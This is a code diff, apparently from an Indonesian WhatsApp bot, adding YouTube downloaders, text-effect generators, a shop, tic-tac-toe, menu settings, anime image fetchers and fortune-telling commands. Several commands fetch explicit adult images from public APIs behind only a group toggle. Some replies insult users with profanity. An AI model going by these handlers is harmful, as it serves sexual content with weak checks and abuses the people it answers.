+sendButLocation(from,`*YOUTUBE DOWNLOADER*📥\n${teks}`, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
+}
+}
+break
+	 
+	
+	
+case 'playmp3':{
+if(!isUrl) return setReply("Masukan link")
+let info = await ytdl.getInfo(q);
+let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
+console.log(audioFormats)
+try{
+low = audioFormats[2].contentLength
+} catch (err){
+low = audioFormats[0].contentLength
+}
+if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
+setReply("*Downloading...*")
+downloadMp3(q) 
+//sendFileFromUrl (audioFormats[0].url, audio, {quoted: dev}) 
+}
+break
+	
+case 'playmp4':{
+if(!isUrl) return setReply("Masukan link")
+let info = await ytdl.getInfo(q);
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
+setReply("*Downloading...*")
+downloadMp4 (q) 
+//sendMediaURL (from, format.url, "Nih")
+}
+break
+
+
+	
+	
+case 'ytmp3':
+try{
+if(!q) return setReply("Masukan link youtube")
+ if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
+if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
+if(!isUrl(q)) return setReply("Masukan link")
+setReply("*Scrapping...*")
+let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
+if(q.includes("https://youtu.be/")){
+var videoId = q.replace('https://youtu.be/', '')
+} else if(q.includes("https://youtube.com/watch?v=")){
+var videoId = q.split('=')[1]
+} else if(q.includes("https://youtube.com/shorts/")){
+var videoId = q.replace('https://youtube.com/shorts/', '')
+}  else {
+return setReply("Link salah")
+}
+
+ let link =`https://youtube.com/watch?v=${videoId}`
+ 
+let anu = await yts(link)
+let info = await ytdl.getInfo(link);
+let format = ytdl.filterFormats(info.formats, 'audioonly');
+if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
+
+teks =`*YOUTUBE AUDIO DOWNLOADER*
+
+📂 Title : ${info.videoDetails.title}
+📄 Size : ${FileSize(format[0].contentLength)}
+🆔 ID : ${videoId}
+⏲️ Duration : ${anu.all[0].timestamp}
+📊 Viewers : ${h2k(anu.all[0].views)}
+🌐 Upload At : ${anu.all[0].ago}
+🔖 Author : ${anu.all[0].author.name}
+?? Channel : ${anu.all[0].author.url}
+🔗 Url : ${anu.all[0].url}
+📝 Description : ${anu.all[0].description}`
+
+sendFileFromUrl(anu.all[0].image, image, {quoted: dev, caption: teks})
+//sendMediaURL (from, format[0].url, "Nih")
+downloadMp3(q) 
+limitAdd(senderNumber, user)
+  } catch(err){
+  console.log(err)
+setReply(`${err}`)
+}
+break
+	
+	
+	
+	case 'ytmp4':
+                 try{
+ if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
+if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return setReply(mess.limit)
+if(!isUrl) return setReply("Masukan link")
+setReply("*Scrapping...*")
+
+if(q.includes("https://youtu.be/")){
+var videoId = q.replace('https://youtu.be/', '')
+} else if(q.includes("https://youtube.com/watch?v=")){
+var videoId = q.split('=')[1]
+} else if(q.includes("https://youtube.com/shorts/")){
+var videoId = q.replace('https://youtube.com/shorts/', '')
+}  else {
+return setReply("Link salah")
+}
+
+ let link =`https://youtube.com/watch?v=${videoId}`
+let anu = await yts(link)
+let info = await ytdl.getInfo(link);
+let format = ytdl.chooseFormat(info.formats, { quality: '18' });
+if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
+
+teks =`*YOUTUBE VIDEO DOWNLOADER*
+
+📂 Title : ${anu.all[0].title}
+💾 Ext : 360p
+📄 Size : ${FileSize(format.contentLength)}
+🆔 ID : ${videoId}
+⏲️ Duration : ${anu.all[0].timestamp}
+📊 Viewers : ${h2k(anu.all[0].views)}
+🌐 Upload At : ${anu.all[0].ago}
+🔖 Author : ${anu.all[0].author.name}
+📹 Channel : ${anu.all[0].author.url}
+🔗 Url : ${anu.all[0].url}
+📝 Description : ${anu.all[0].description}`
+
+sendFileFromUrl(anu.all[0].image, image, {quoted: dev, caption: teks})
+downloadMp4(q) 
+//sendMediaURL (from, format.url, "Nih")
+limitAdd(senderNumber, user)
+  } catch(err){
+setReply(`${err}`)
+}
+break
+	
+	
+	case 'joker':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/create-logo-joker-online-934.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	case 'dropwater':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/dropwater-text-effect-872.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	case 'neonlight':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	case 'thewall':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/break-wall-text-effect-871.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	
+	case 'natural':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	case 'carbon':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/carbon-text-effect-833.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+	
+	
+	case 'pencil':
+	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
+	setReply(mess.wait)
+	textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
+    `${q}`,])
+  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
+  .catch((err) => console.log(err));
+   break
+	
+	
+case 'shop':
+teks = `
+*]────「 SHOP」────[*
+
+Halo ${pushname} 
+Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}
+
+• List Harga
+1 Limit : Rp 1000
+1 Limit Game : Rp 750
+1 Jam Premium : Rp 50,000
+
+NOTE :
+Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
+Contoh : ${prefix}buylimit 10
+
+Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
+Contoh : ${prefix}buyglimit 10`
+setReply(teks)
+break
+
+	
+	         case 'tictactoe': case 'ttt': case 'ttc':
+            if(!isGroup) return setsetReply("Hanya bisa di group")
+		
+                if (isTicTacToe(from, tictactoe)) return setReply(`Masih ada game yg blum selesai`)
+            //    if (args.length < 2) return setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
+                if (mentionByTag.length == 1) {
+				if (mentionByTag[0] === botNumber) return setReply(`Tidak bisa bermain dengan bot!`)
+                if (mentionByTag[0] === sender) return setReply(`Sad amat main ama diri sendiri`)
+                     var hadiah = randomNomor(2500)
+				     mentions(`@${sender.split('@')[0]} menantang @${mentionByTag[0].split('@')[0]}\nuntuk bermain TicTacToe\n\nKetik Y untuk bermain 👊\nKetik N untuk menolak 👎\nKetik ${prefix}delttt untuk membatalkan permainan 🚫\n\nHadiah : Rp ${hadiah.toLocaleString()}`, [sender, mentionByTag[0]], false)
+                     tictactoe.push({
+                        id: from,
+                        status: null,
+						hadiah: hadiah,
+                        penantang: sender,
+                        ditantang: mentionByTag[0],
+                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
+                     })
+					 gameAdd(senderNumber, user)
+                } else {
+                    setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
+                }
+                break
+			case 'delttt':
+            case 'delttc':
+ if(!isGroup) return setsetReply("Hanya bisa di group")
+				if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
+                if (!isTicTacToe(from, tictactoe)) return setReply(`Tidak ada sesi game tictactoe di grup ini`)
+                var posi = getPosTic(from, tictactoe)
+                if (tictactoe[posi].penantang.includes(sender)) {
+                    tictactoe.splice(posi, 1)
+                    setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
+                 } else if (tictactoe[posi].ditantang.includes(sender)) {
+                     tictactoe.splice(posi, 1)
+                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
+                 } else if (isGroupAdmins) {
+                     tictactoe.splice(posi, 1)
+                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
+                 } else if (isOwner) {
+                     tictactoe.splice(posi, 1)
+                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
+                 } else {
+                   setReply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
+                }
+                break
+                
+                
+
+	
+
+          
+        
+        
+case 'nsfwmenu':   
+menunya = hentong.ahah(prefix, pushname)
+let woker = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
+                       {"buttonId": `${prefix}sewabot`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+if(setmenu === "katalog") {
+costum(`*Loading...*`)
+sendKatalog(hentong.ahah(prefix, pushname))
+} else if(setmenu === "troli") {
+sendTroli(hentong.ahah(prefix, pushname))
+} else if(setmenu === "lokasi") {
+costum(`*Loading...*`)
+sendButLocation(from, menunya, `© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {contextInfo: forward})
+} else if(setmenu === "gif") {
+costum(`*Loading...*`)
+sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
+} else if(setmenu === "dokumen") {
+costum(`*Loading...*`)
+Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), woker, options)
+} else if(setmenu === "image") {
+costum(`*Loading...*`)
+sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {thumbnail: thumb, fileLength: 999999999999 })
+}
+break
+
+	
+	
+case 'menu':
+case 'help':   
+case 'allmenu':   
+try{
+stod = `${sender}`
+menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, thePrefix, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
+let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
+                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+  options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}}  
+options1 = {quoted: setQuoted, contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: thumb,mediaUrl:`https://www.instagram.com/reel/CZCA-viBoxa/?utm_medium=copy_link`}}}
+if(setmenu === "katalog") {
+costum(`*Loading...*`)
+sendKatalog(menunya)
+}  else if(setmenu === "troli") {
+sendTroli(menunya)
+}else  if(setmenu === "document") {
+costum(`*Loading...*`)
+Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options1)
+} else  if(setmenu === "lokasi") {
+costum(`*Loading...*`)
+sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, {contextInfo: forward})
+} else  if(setmenu === "gif") {
+costum(`*Loading...*`)
+sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
+} else if(setmenu === "image") {
+costum(`*Loading...*`)
+sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, options)
+}
+} catch(err) {
+sendMess(err)
+sendTroli(menunya)
+}
+break
+	
+	
+	
+	
+        case 'setmenu':
+	if(!isOwner) return
+	if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
+		setmenu = "katalog"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		} else if ((args[0]) === 'image'|| (args[0]) === 'foto' ){
+		setmenu = "image"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		} else if ((args[0]) === 'lokasi' ){
+		setmenu = "lokasi"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		} else if ((args[0]) === 'troli' ){
+		setmenu = "troli"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		}else if ((args[0]) === 'pptx'){
+		docType = "pptx"
+		setmenu = "document"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		} else if ((args[0]) === 'xlsx'){
+		docType = "xlsx"
+		setmenu = "document"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+	} else if ((args[0]) === 'zip'){
+		docType = "zip"
+		setmenu = "document"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+		} else if ((args[0]) === 'pdf'){
+		docType = "pdf"
+		setmenu = "document"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+	} else if ((args[0]) === 'docx'){
+		docType = "docx"
+		setmenu = "document"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+	} else if ((args[0]) === 'gif'){
+		setmenu = "gif"
+		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+	}  else if (!q) {
+                      sendButMessage(from, `SETTING MENU\n1.Katalog\n2.Troli\n3.Lokasi\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
+                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
+                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
+                    } else {
+                    setReply("Menu tidak di temukan om")
+                    }
+	break
+        
+
+
+
+        
+
+
+
+
+
+case 'setquoted':
+	if(!isOwner) return onlyOwner()
+	if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
+		if(Qoted === "ftoko") return setReply("Udah aktif")
+		Qoted = "ftoko"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftoko})
+		} else if ((args[0]) === 'fkontak' ){
+		if(Qoted === "fkontak") return setReply("Udah aktif")
+		Qoted = "fkontak"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fkontak})
+		} else if ((args[0]) === 'ftext'){
+		if(Qoted === "ftext") return setReply("Udah aktif")
+		Qoted = "ftext"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftext})
+		} else if ((args[0]) === 'ftroli'){
+		if(Qoted === "ftroli") return setReply("Udah aktif")
+		Qoted = "ftroli"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftroli})
+		}else if ((args[0]) === 'fsticker' ){
+		if(Qoted === "fsticker") return setReply("Udah aktif")
+		Qoted = "fsticker"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fsticker})
+		} else if ((args[0]) === 'fvn'){
+		if(Qoted === "fvn") return setReply("Udah aktif")
+		Qoted = "fvn"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvn})
+		} else if ((args[0]) === 'floc'){
+		if(Qoted === "floc") return setReply("Udah aktif")
+		Qoted = "floc"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: floc})
+		} else if ((args[0]) === 'fvideo' ){
+		if(Qoted === "fvideo") return setReply("Udah aktif")
+		Qoted = "fvideo"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvideo})
+		} else if ((args[0]) === 'fgc'){
+		if(Qoted === "fgc") return setReply("Udah aktif")
+		Qoted = "fgc"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgc})
+		} else if ((args[0]) === 'fgif'){
+		if(Qoted === "fgif") return setReply("Udah aktif")
+		Qoted = "fgif"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgif})
+		}else if ((args[0]) === 'fimage'){
+		if(Qoted === "fimage") return setReply("Udah aktif")
+		Qoted = "fimage"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fimage})
+		} else if ((args[0]) === 'dev'){
+		if(Qoted === "dev") return setReply("Udah aktif")
+		Qoted = "dev"
+		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: dev})
+		} else if (!q) {
+        sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
+        {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
+        {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
+        {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}]);
+         } else {
+ teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
+ setReply(teks)
+ }
+	break
+
+
+
+case 'setreply':
+if(!isOwner) return onlyOwner()
+if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
+if(replyType === "web") return setReply("Udah aktif")
+replyType = "web"
+setReply(`Berhasil mengubah set reply ke ${q}`)
+} else if ((args[0]) === 'troli' ){
+if(replyType === "troli") return setReply("Udah aktif")
+replyType = "troli"
+setReply(`Berhasil mengubah set reply ke ${q}`)
+} else if ((args[0]) === 'mess'){
+if(replyType === "mess") return setReply("Udah aktif")
+replyType = "mess"
+setReply(`Berhasil mengubah set reply ke ${q}`)
+} else if ((args[0]) === 'vidio'|| (args[0]) === 'video' ){
+if(replyType === 'vidio') return setReply("Udah aktif")
+replyType = "video"
+setReply(`Berhasil mengubah setReply ke ${q}`)
+} else if ((args[0]) === 'quoted' ){
+if(replyType === 'quoted') return setReply("Udah aktif")
+replyType = "quoted"
+setReply(`Berhasil mengubah set reply ke ${q}`)
+} else if (!q) {
+sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
+{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
+{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
+{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
+ } else {
+ setReply("Set Reply Tidak Di Temukan")
+}
+break
+
+
+
+
+
+
+  
+	case 'setbc':
+	if(!isOwner) return onlyOwner()
+	if ((args[0]) === 'troli'|| (args[0]) === 'product' ){
+		if(setBc === "troli") return setReply("Udah aktif")
+		setBc = "troli"
+		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke troli", text, {quoted: setQuoted})
+		} else if ((args[0]) === 'lokasi' ){
+		if(setBc === "lokasi") return setReply("Udah aktif")
+		setBc = "lokasi"
+		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke lokasi", text, {quoted: setQuoted})
+		} else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
+		if(setBc === "document") return setReply("Udah aktif")
+		setBc = "document"
+		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke dokumen", text, {quoted: setQuoted})
+		} else if (!q) {
+                      sendButMessage(from, `SETTING BROADCAST`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}setbc pdf`, buttonText: {displayText: `ᴅᴏᴋᴜᴍᴇɴ`},type: 1},
+                      {buttonId: `${prefix}setbc troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
+                      {buttonId: `${prefix}setbc lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
+                    }
+	break
+	
+	
+	
+		
+	
+	
+	
+	 
+
+	
+	
+	                case 'neko':
+					case 'waifu':
+					case 'trap':
+					case 'blowjob':
+					
+					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
+					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					setReply(mess.wait)
+					ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
+                    sendMediaURL(from, ana.url, 'Done!')
+                    limitAdd(senderNumber, user)
+					break
+					
+					case 'yuri':
+					case 'kiss':
+					case 'cum':
+					case 'futanari':
+					case 'hentai':
+					case 'eroyuri':
+					case 'eron':
+					case 'erok':
+					case 'ero':
+					case 'solo':
+					case 'erokemo':
+					case 'fox_girl':
+					case 'feet':
+					case 'les':
+					case 'feed':
+					case 'bj':
+					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
+					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					setReply(mess.wait)
+					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
+					sendMediaURL(from, ana.url, 'Done!')
+                    limitAdd(senderNumber, user)
+					break
+				
+				     
+                     case 'neko':
+                     case 'shinobu':
+                     case 'megumin':
+				     case 'bully':
+                     case 'cuddle':
+                     case 'cry':
+                     case 'hug':
+				     case 'awoo':
+                     case 'kiss':
+                     case 'lick':
+                     case 'pat':
+				     case 'smug':
+                     case 'bonk':
+                     case 'yeet':
+                     case 'blush':
+				     case 'smile':
+                     case 'wave':
+                     case 'highfive':
+                     case 'handhold':
+				     case 'nom':
+                     case 'bite':
+                     case 'glomp':
+                     case 'slap':
+				     case 'kill':
+                     case 'happy':
+                     case 'wink':
+					setReply(mess.wait)
+					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
+					sendMediaURL(from, ana.url, 'Done!')
+                    limitAdd(senderNumber, user)
+					break
+					
+					case 'waifunime':
+					setReply(mess.wait)
+					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
+                    sendMediaURL(from, ana.url, 'Done!')
+                    limitAdd(senderNumber, user)
+					break
+					
+					
+					
+					
+					case 'baka':
+					case 'hug':
+					case 'kemonomimi':
+					case 'holo':
+					setReply(mess.wait)
+					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
+                    sendMediaURL(from, ana.url, 'Done!')
+                    limitAdd(senderNumber, user)
+					break
+				
+	
+	
+	//PRIMBON
+	case 'artinama':
+	try{
+	if(!q) return setReply("Namanya apa kak ?")
+	primbon.artiNama(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+
+
+case 'artimimpi':
+try{
+if(!q) return setReply("Mimpi apa semalem ?")
+primbon.tafsirMimpi(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+
+case 'namapasangan':
+try{
+if(!q) return setReply("Namanya siapa kak ? Contoh jajas titin")
+if(args.length < 2) return setReply("Masukan nama pasangan Contoh jajas titin")
+if(args.length > 2) return setReply("Masukan nama pasangan Contoh jajas titin")
+primbon.Jodoh(args[0],args[1]).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+case 'tanggaljadian':
+try{
+if(!q) return setReply("Tanggal berapa kak ? Contoh 01-07-2000")
+primbon.tanggaljadi(q).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+case 'tipewatak':
+try{
+if(!q) return setReply("Teksnya ? Contoh nih Michelle Ziudith 20-1-1995")
+if(args.length < 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
+if(args.length > 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
+primbon.watakartis(args[0], args[1]).then(res => {
+    setReply(res)
+})
+} catch (err) {
+console.log(err)
+setReply("Bjeer error, coba lagi dong 😋")
+}
+break
+
+case 'ramalanjodoh':
+try{
+if(!q) return setReply(" Teksnya ? Contoh nih joe 11-4-2003 putri 1-2-2005")
+if(args.length < 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
+if(args.length > 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
+primbon.ramalanjodoh(args[0], args[1], args[2],args[3]).then(res => {
+    setReply(res)
+})
+} catch (err) {
